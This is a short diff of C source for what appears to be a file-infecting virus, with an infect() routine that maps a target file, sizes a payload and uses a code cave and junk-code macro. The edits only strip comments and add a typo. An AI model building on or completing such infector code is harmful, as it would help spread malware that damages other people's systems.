@@ -41,7 +41,7 @@ void	_start(void);
 #define JMP_SIZE 4
 
 /* _start should be here cause we want it at 0x1000,
- * note: we could use a linker script
+ * note: we coulduse a linker script
  * the linker should compile this file first */
 
 void __attribute__((naked)) _start(void)
@@ -177,13 +177,10 @@ static int	infect(const char *filename, bootstrap_data_t *bs_data)
 	data_t data;
 	ft_memset(&data, 0, sizeof(data_t)); JUNK;
 
-	/* copy the name of the target */
 	ft_strncpy(data.target_name, filename, sizeof(data.target_name));
 
-	/* get our own name */
 	data.bs_data = bs_data;
 
-	/* calculate the size of the payload before the mapping */
 	data.cave.p_size = (uintptr_t)&real_end - (uintptr_t)&_start;
 
 	if (map_file(filename, &data) != 0) {
